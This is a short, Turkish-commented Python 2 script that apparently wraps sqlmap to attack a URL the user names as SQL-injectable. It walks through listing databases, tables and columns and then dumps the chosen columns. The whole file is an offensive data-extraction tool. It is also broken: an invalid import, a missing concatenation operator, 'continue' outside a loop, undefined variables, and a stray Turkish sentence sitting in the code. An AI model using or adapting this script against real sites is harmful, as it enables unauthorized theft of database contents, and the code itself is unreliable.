#!/usr/bin/python
#BU PROGRAM REQUESTKING Tarafindan Yazilmistir.Ve Sadece Linux/GNUe 'da calismaktadir.
import os,time
from 1 import *
os.system('clear')
def SQLInjection(a):
    cls = 'clear'
    inj='sqlmap -u'
    os.system(inj+a+' --dbs')
    dbs = raw_input('[?]Hangi Veritabanina giris yapacaksiniz? \n +')
    os.system(cls)
    os.system(inj+a+' -D '+dbs' --tables')
    tables = raw_input('[?]Hangi Tabloya giris yapacaksiniz? \n +')
    os.system(cls)
    os.system(inj+a+' -D '+dbs+' -T'+tables+' --columns')
    dumping = raw_input('[?]Hangi Kolonlari Kiracaksiniz birden fazla kolon kiracaksaniz? \n[!]Virgulle ayirarak yaziniz. \n +')
    os.system(cls)
    os.system(inj+a+' -D'+dbs+' -T'+tables+' -C'+dumping+' --dump')

if host[-1] == '/':
   continue
else:
  host = host+'/'

SQLHOST = raw_input('[?]SQL Acikli URL Sonu nedir. ? \n'+host)

if os.name == "posix":
    while(True):
       SQLInjection(SQLHOST)
       soru1 = raw_input("[!]Tekrar Veritabanina Goz Atacakmisiniz?.y/n \n +")
       if soru1 == 'y':
          SQLInjection(SQLHOST)
       elif soru1 == 'n':
          break
       else:
          Böyle bir cevap yok!
          os.system(cls)
          continue  
else:
   print "[-]Linux Kullanmiyorsunuz. "
   print "[-_-]Gorusmek Uzere!!!"

